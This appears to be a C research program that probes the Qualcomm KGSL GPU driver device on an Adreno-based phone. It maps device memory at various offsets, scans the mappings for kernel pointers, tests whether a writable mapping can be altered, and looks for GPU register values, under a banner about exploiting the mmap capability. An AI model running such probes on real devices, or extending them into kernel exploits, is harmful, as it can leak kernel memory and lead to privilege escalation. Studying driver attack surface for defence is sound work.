/*
 * KGSL Offset 0x1000 Deep Exploration
 * ====================================
 *
 * CRITICAL FINDING: mmap(offset=0x1000) succeeds!
 * This offset maps to something in the GPU driver.
 *
 * Also: read() returns "OH HAI GPU\n" - debug message!
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <signal.h>
#include <setjmp.h>

static int g_fd = -1;
static sigjmp_buf g_jmpbuf;

void sigfault_handler(int sig)
{
    siglongjmp(g_jmpbuf, 1);
}

void setup_fault_handler(void)
{
    struct sigaction sa;
    sa.sa_handler = sigfault_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
}

void hexdump(const void *data, size_t size)
{
    const unsigned char *p = (const unsigned char *)data;
    for (size_t i = 0; i < size; i++)
    {
        if (i % 32 == 0)
            printf("%04zx: ", i);
        printf("%02x ", p[i]);
        if ((i + 1) % 32 == 0)
            printf("\n");
    }
    if (size % 32 != 0)
        printf("\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// Explore the 0x1000 mapping
// ═══════════════════════════════════════════════════════════════════════════

void explore_offset_0x1000(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  Exploring mmap offset 0x1000                                     ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    // Map with different sizes
    size_t sizes[] = {0x1000, 0x2000, 0x4000, 0x10000, 0x100000};

    for (int i = 0; i < sizeof(sizes) / sizeof(sizes[0]); i++)
    {
        void *ptr = mmap(NULL, sizes[i], PROT_READ, MAP_SHARED, g_fd, 0x1000);

        if (ptr != MAP_FAILED)
        {
            printf("[+] Size 0x%zx: SUCCESS at %p\n", sizes[i], ptr);
            munmap(ptr, sizes[i]);
        }
        else
        {
            printf("[-] Size 0x%zx: %s\n", sizes[i], strerror(errno));
        }
    }

    // Map and explore content
    printf("\n[*] Mapping 64KB for detailed exploration...\n\n");

    void *ptr = mmap(NULL, 0x10000, PROT_READ, MAP_SHARED, g_fd, 0x1000);

    if (ptr == MAP_FAILED)
    {
        printf("[-] Failed to map: %s\n", strerror(errno));
        return;
    }

    printf("[+] Mapped 64KB at %p\n\n", ptr);

    // Scan for non-zero content
    printf("[*] Scanning for non-zero pages...\n");

    for (size_t page = 0; page < 16; page++)
    {
        if (sigsetjmp(g_jmpbuf, 1) == 0)
        {
            uint8_t *p = (uint8_t *)ptr + page * 4096;

            int non_zero = 0;
            for (int i = 0; i < 4096; i++)
            {
                if (p[i] != 0)
                    non_zero++;
            }

            if (non_zero > 0)
            {
                printf("\n[!] Page %zu (offset 0x%zx): %d non-zero bytes\n",
                       page, page * 4096, non_zero);
                printf("    First 64 bytes:\n");
                hexdump(p, 64);
            }
        }
        else
        {
            printf("[*] Page %zu: FAULT (unmapped)\n", page);
            break;
        }
    }

    // Look for kernel pointers
    printf("\n[*] Scanning for kernel pointers...\n");

    uint64_t *u64 = (uint64_t *)ptr;
    int found = 0;

    for (size_t i = 0; i < 0x10000 / 8; i++)
    {
        if (sigsetjmp(g_jmpbuf, 1) == 0)
        {
            uint64_t val = u64[i];

            // Kernel pointer pattern
            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
            {
                printf("    [KERNEL PTR] offset 0x%04zx: 0x%016llx\n",
                       i * 8, (unsigned long long)val);
                found++;
                if (found >= 10)
                    break;
            }

            // Also check for interesting values
            if (val != 0 && found < 20)
            {
                // Just non-zero, interesting structure
            }
        }
        else
        {
            break;
        }
    }

    if (found == 0)
    {
        printf("    No kernel pointers found in accessible range\n");
    }

    // Try to write (probably fails)
    printf("\n[*] Trying write access...\n");

    void *ptr_rw = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_SHARED, g_fd, 0x1000);

    if (ptr_rw != MAP_FAILED)
    {
        printf("[!!!] WRITE mapping succeeded at %p!\n", ptr_rw);

        // Try writing
        if (sigsetjmp(g_jmpbuf, 1) == 0)
        {
            volatile uint32_t *p = (volatile uint32_t *)ptr_rw;
            uint32_t original = *p;
            *p = 0xDEADBEEF;
            uint32_t written = *p;
            *p = original;

            printf("    Original: 0x%08x\n", original);
            printf("    After write: 0x%08x\n", written);

            if (written == 0xDEADBEEF)
            {
                printf("[!!!] WRITE SUCCEEDED!\n");
            }
        }
        else
        {
            printf("    Write caused fault\n");
        }

        munmap(ptr_rw, 0x1000);
    }
    else
    {
        printf("[-] Write mapping failed: %s\n", strerror(errno));
    }

    munmap(ptr, 0x10000);
}

// ═══════════════════════════════════════════════════════════════════════════
// Scan all possible offsets for valid mappings
// ═══════════════════════════════════════════════════════════════════════════

void scan_all_offsets(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  Scanning All Offset Space                                        ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] Scanning offsets 0x0000 to 0xFFFF0000 (step 0x1000)...\n");
    printf("    This may take a moment...\n\n");

    int found = 0;

    // Focus on low offsets first
    for (off_t offset = 0; offset <= 0xFFFF000; offset += 0x1000)
    {
        void *ptr = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, g_fd, offset);

        if (ptr != MAP_FAILED)
        {
            printf("[+] Offset 0x%08llx: Mapped at %p",
                   (unsigned long long)offset, ptr);

            // Read first bytes
            if (sigsetjmp(g_jmpbuf, 1) == 0)
            {
                uint64_t val = *(volatile uint64_t *)ptr;
                printf(" - first qword: 0x%016llx", (unsigned long long)val);
            }
            printf("\n");

            munmap(ptr, 0x1000);
            found++;

            if (found >= 20)
            {
                printf("    ... (stopping after 20 matches)\n");
                break;
            }
        }

        // Progress indicator
        if (offset % 0x1000000 == 0 && offset > 0)
        {
            printf("    Scanned to 0x%08llx...\n", (unsigned long long)offset);
        }
    }

    printf("\n[*] Found %d valid mmap offsets\n", found);
}

// ═══════════════════════════════════════════════════════════════════════════
// Analyze the read() output
// ═══════════════════════════════════════════════════════════════════════════

void analyze_read_interface(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  Analyze read() Interface                                         ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    char buf[4096];

    // Multiple reads
    printf("[*] Performing multiple read() calls...\n\n");

    for (int i = 0; i < 5; i++)
    {
        ssize_t n = read(g_fd, buf, sizeof(buf));

        if (n > 0)
        {
            buf[n] = '\0'; // Null terminate
            printf("    Read %d (%zd bytes): \"", i + 1, n);

            // Print printable chars
            for (int j = 0; j < n; j++)
            {
                if (buf[j] >= 0x20 && buf[j] <= 0x7e)
                {
                    putchar(buf[j]);
                }
                else if (buf[j] == '\n')
                {
                    printf("\\n");
                }
                else
                {
                    printf("\\x%02x", (unsigned char)buf[j]);
                }
            }
            printf("\"\n");
        }
        else if (n == 0)
        {
            printf("    Read %d: EOF\n", i + 1);
            break;
        }
        else
        {
            printf("    Read %d: Error %s\n", i + 1, strerror(errno));
            break;
        }

        usleep(100000); // 100ms delay
    }

    // Reset by closing and reopening
    printf("\n[*] Testing if reads are stateful...\n");

    close(g_fd);
    g_fd = open("/dev/kgsl-3d0", O_RDWR);

    if (g_fd >= 0)
    {
        ssize_t n = read(g_fd, buf, sizeof(buf));
        if (n > 0)
        {
            buf[n] = '\0';
            printf("    After reopen (%zd bytes): \"", n);
            for (int j = 0; j < n && j < 50; j++)
            {
                if (buf[j] >= 0x20 && buf[j] <= 0x7e)
                {
                    putchar(buf[j]);
                }
                else if (buf[j] == '\n')
                {
                    printf("\\n");
                }
            }
            printf("\"\n");
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Try to find GPU registers via mmap
// ═══════════════════════════════════════════════════════════════════════════

void explore_gpu_registers(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  Looking for GPU Register Mappings                                ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    // Map offset 0x1000 and look for register-like patterns
    void *ptr = mmap(NULL, 0x10000, PROT_READ, MAP_SHARED, g_fd, 0x1000);

    if (ptr == MAP_FAILED)
    {
        printf("[-] mmap failed\n");
        return;
    }

    printf("[*] Mapped 64KB at %p\n\n", ptr);

    // Look for patterns that look like hardware registers
    // GPU registers often have specific bit patterns

    uint32_t *u32 = (uint32_t *)ptr;

    printf("[*] Looking for GPU ID / version registers...\n");

    // Adreno 621 ChipID should be 0x06020100
    for (size_t i = 0; i < 0x10000 / 4; i++)
    {
        if (sigsetjmp(g_jmpbuf, 1) == 0)
        {
            uint32_t val = u32[i];

            if (val == 0x06020100)
            { // Adreno 621
                printf("[!] Found ChipID 0x06020100 at offset 0x%zx!\n", i * 4);
            }
            if ((val & 0xFFFF0000) == 0x06000000)
            { // Adreno 6xx
                printf("[!] Possible A6XX ID at offset 0x%zx: 0x%08x\n", i * 4, val);
            }
            if (val == 0x00000612 || val == 0x00000621)
            { // GPU rev
                printf("[!] Possible GPU rev at offset 0x%zx: 0x%08x\n", i * 4, val);
            }
        }
        else
        {
            break;
        }
    }

    // Look for counter-like values (might be perf counters)
    printf("\n[*] Looking for active registers (non-zero, non-0xFFFFFFFF)...\n");

    int active_count = 0;
    for (size_t i = 0; i < 0x10000 / 4 && active_count < 20; i++)
    {
        if (sigsetjmp(g_jmpbuf, 1) == 0)
        {
            uint32_t val = u32[i];

            if (val != 0 && val != 0xFFFFFFFF)
            {
                printf("    Offset 0x%04zx: 0x%08x\n", i * 4, val);
                active_count++;
            }
        }
        else
        {
            break;
        }
    }

    munmap(ptr, 0x10000);
}

// ═══════════════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════════════

int main(void)
{
    printf("\n");
    printf("╔════════════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Offset 0x1000 Deep Exploration                               ║\n");
    printf("║  Exploiting discovered mmap capability                             ║\n");
    printf("╚════════════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] UID=%d, EUID=%d\n", getuid(), geteuid());

    setup_fault_handler();

    g_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_fd < 0)
    {
        printf("[-] Failed to open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0 (fd=%d)\n", g_fd);

    explore_offset_0x1000();
    scan_all_offsets();
    analyze_read_interface();
    explore_gpu_registers();

    close(g_fd);

    printf("\n[*] Exploration complete\n\n");

    return 0;
}
